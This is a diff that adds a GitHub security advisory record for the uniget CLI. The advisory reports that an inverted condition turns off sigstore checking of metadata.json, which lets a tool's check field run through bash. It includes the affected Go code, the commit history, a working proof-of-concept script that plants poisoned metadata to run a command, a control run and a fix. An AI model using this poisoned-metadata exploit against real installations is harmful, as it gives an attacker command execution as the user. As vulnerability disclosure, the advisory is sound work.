@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-fhgh-wq4q-r37x",
+  "modified": "2026-08-17T18:00:08.814905319Z",
+  "published": "2026-08-17T17:50:34Z",
+  "summary": "uniget CLI: Metadata signature verification only runs when UNIGET_IGNORE_METADATA_SIGNATURE is set",
+  "details": "## Summary\n\nThe sigstore check on `metadata.json` is gated on the wrong side of the condition. `LoadMetadata` in `internal/config/update.go:81` verifies the bundle only when `UNIGET_IGNORE_METADATA_SIGNATURE` is non-empty, so in a normal run, where nobody sets that variable, the signature is never checked. Setting the variable that is named \"ignore the signature\" is what turns verification on.\n\nThat matters because `metadata.json` populates `Tool.Check`, and `pkg/tool/tool.go:250` runs `Tool.Check` through `/bin/bash -c`. That is the same sink as CVE-2026-45152, and the signature check added in v0.27.1 to close it is the control that no longer runs.\n\n## Where it is\n\n`internal/config/update.go:80-100`:\n\n```go\nfunc (c *Config) LoadMetadata(filename string) (loadedTools *tool.Tools, err error) {\n\tif len(os.Getenv(\"UNIGET_IGNORE_METADATA_SIGNATURE\")) \u003e 0 {\n\t\t_, err = security.VerifySigstoreBundle(\n\t\t\tfilename,\n\t\t\tfilename+\".sigstore.json\",\n\t\t\t...\n\t\t)\n\t\tif err != nil {\n\t\t\treturn nil, fmt.Errorf(\"error verifying sigstore bundle for metadata: %s\", err)\n\t\t}\n\t}\n\n\tloadedTools, err = tool.LoadFromFile(filename)\n```\n\n`cmd/uniget/main.go:102-105` carries the same flipped condition in the decision about whether to re-download metadata:\n\n```go\nif !myos.FileExists(configuration.Prefix+\"/\"+configuration.GetMetadataFile()) ||\n\tconfiguration.AutoUpdate ||\n\t(len(os.Getenv(\"UNIGET_IGNORE_METADATA_SIGNATURE\")) \u003e 0 \u0026\u0026\n\t\t!myos.FileExists(configuration.Prefix+\"/\"+configuration.GetMetadataFile()+\".sigstore.json\")) {\n```\n\nso a cached `metadata.json` with no `.sigstore.json` beside it is not refetched either, as long as the variable is unset.\n\n`LoadMetadata` is called from `cmd/uniget/main.go:115` in the persistent pre-run, which means every subcommand loads metadata this way. The sink is `pkg/tool/tool.go:248-251`:\n\n```go\nfunc (tool *Tool) RunVersionCheck() (string, error) {\n\tlogging.Tracef(\"Running version check for %s: %s\", tool.Name, tool.Check)\n\tcmd := exec.Command(\"/bin/bash\", \"-c\", tool.Check+\" | tr -d '\\n'\")\n```\n\n## How it got this way\n\nThe check was introduced correctly. In d12ef12c (\"fix: Only accept signed metadata\", released as v0.27.1) `VerifySigstoreBundle` was called unconditionally. 370d0155 then wrapped it in `if os.Getenv(\"UNIGET_IGNORE_METADATA_SIGNATURE\") != \"true\"`, which is still the right polarity. b68a27d5 (\"fix: Accept any non-empty value\"), which is the commit tagged v0.27.4, rewrote that as `if len(os.Getenv(\"UNIGET_IGNORE_METADATA_SIGNATURE\")) \u003e 0`. The intent was clearly to accept any truthy value instead of the literal string \"true\", but the negation was dropped in the rewrite and the meaning flipped.\n\n## Proof of concept\n\nBuilt from a clean checkout of the v0.28.2 tag with `go build -o /tmp/unigetbin ./cmd/uniget`, then run in user mode against a poisoned cache with no `metadata.json.sigstore.json` present and `UNIGET_IGNORE_METADATA_SIGNATURE` explicitly removed from the environment.\n\n```bash\nH=/tmp/pochome\nmkdir -p $H/.cache/uniget $H/.local/state/uniget/manifests $H/.local/bin $H/.config/uniget $H/.cache/uniget/evil\ncat \u003e $H/.cache/uniget/metadata.json \u003c\u003c'EOF'\n{\"tools\":[{\"name\":\"evil\",\"version\":\"1.0.0\",\"binary\":\"${target}/bin/evil\",\n\"check\":\"id \u003e /tmp/uniget-rce-proof.txt; echo PWNED\",\"tags\":[\"test\"],\n\"description\":\"poisoned metadata\",\"repository\":\"https://example.com\",\n\"license\":{\"name\":\"MIT\",\"link\":\"https://example.com\"},\n\"sources\":[{\"registry\":\"ghcr.io\",\"repository\":\"uniget-org/tools\"}]}]}\nEOF\nprintf '#!/bin/sh\\necho 1.0.0\\n' \u003e $H/.local/bin/evil; chmod +x $H/.local/bin/evil\ntouch $H/.cache/uniget/evil/1.0.0\n\nenv -u UNIGET_IGNORE_METADATA_SIGNATURE HOME=$H XDG_CACHE_HOME=$H/.cache \\\n  XDG_STATE_HOME=$H/.local/state XDG_CONFIG_HOME=$H/.config \\\n  /tmp/unigetbin --user version evil\n```\n\nObserved output:\n\n```text\nPWNED\n```\n\nand `/tmp/uniget-rce-proof.txt` contains the output of `id`. No signature error was raised, even though there is no bundle file at all.\n\nThe control run is the part that pins down the polarity. Same command, same poisoned metadata, only now a `metadata.json.sigstore.json` exists (deliberately not a valid bundle) and the \"ignore\" variable is set:\n\n```bash\necho '{\"not\":\"a real bundle\"}' \u003e $H/.cache/uniget/metadata.json.sigstore.json\nUNIGET_IGNORE_METADATA_SIGNATURE=1 HOME=$H XDG_CACHE_HOME=$H/.cache \\\n  XDG_STATE_HOME=$H/.local/state XDG_CONFIG_HOME=$H/.config \\\n  /tmp/unigetbin --user version evil\n```\n\nObserved output:\n\n```text\nError: error loading metadata: error verifying sigstore bundle for metadata: error loading bundle from path /tmp/pochome/.cache/uniget/metadata.json.sigstore.json: proto: (line 1:2): unknown field \"not\"\n```\n\nSo verification runs when the ignore variable is set, and does not run when it is unset.\n\n## Impact\n\nAnything that can substitute the metadata layer gets command execution as the user running uniget: a compromised or attacker-chosen registry or mirror for `uniget-org/tools`, a tampered tarball on the way into the cache, or a poisoned cache file. The sigstore bundle is the only thing standing between that metadata and `/bin/bash -c`, and right now it is not consulted. Locally this reproduces the CVE-2026-45152 scenario on a supposedly fixed version; the wider concern is that the supply chain check for the tool catalogue is effectively off for every user.\n\n## Suggested fix\n\nInvert the condition so verification is the default and the environment variable opts out:\n\n```go\nif len(os.Getenv(\"UNIGET_IGNORE_METADATA_SIGNATURE\")) == 0 {\n\t_, err = security.VerifySigstoreBundle(...)\n\t...\n}\n```\n\nThe same inversion is needed at `cmd/uniget/main.go:104`, where the re-download decision should be \"the bundle is missing and we are not ignoring signatures\". It would also be worth failing closed when the `.sigstore.json` file is absent rather than treating a missing bundle as nothing to verify.\n\n## Deduplication\n\nCVE-2026-45152 (GHSA-qqq4-5773-pmw5) covers the `tool.Check` command injection itself and is marked patched in v0.27.1. This report is not that finding again: it is that the patch, which was the signature check, stopped running as of v0.27.4 because of the condition rewrite in b68a27d5. The other two published advisories, GHSA-m6jg-wr9m-cg2f and GHSA-qmcq-xw74-w667, are about hook file paths and the EDITOR variable and do not touch metadata loading.\n\n## How I found it and a note on tooling\n\nI was reading the shipped fix for CVE-2026-45152 to see whether the guard covered all the paths that reach `RunVersionCheck`, and the gate condition read backwards on first pass, so I walked the history of that line back to the commit that introduced it. I used AI tooling while investigating, and I built the CLI at v0.28.2 and ran both the exploit and the control myself before writing this up.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "gitlab.com/uniget-org/cli",
+        "purl": "pkg:golang/gitlab.com/uniget-org/cli"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0.27.4"
+            },
+            {
+              "fixed": "0.28.9"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-fhgh-wq4q-r37x/GHSA-fhgh-wq4q-r37x.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/uniget-org/cli/security/advisories/GHSA-fhgh-wq4q-r37x"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/uniget-org/cli"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/uniget-org/cli/releases/tag/v0.28.9"
+    }
+  ]
+}
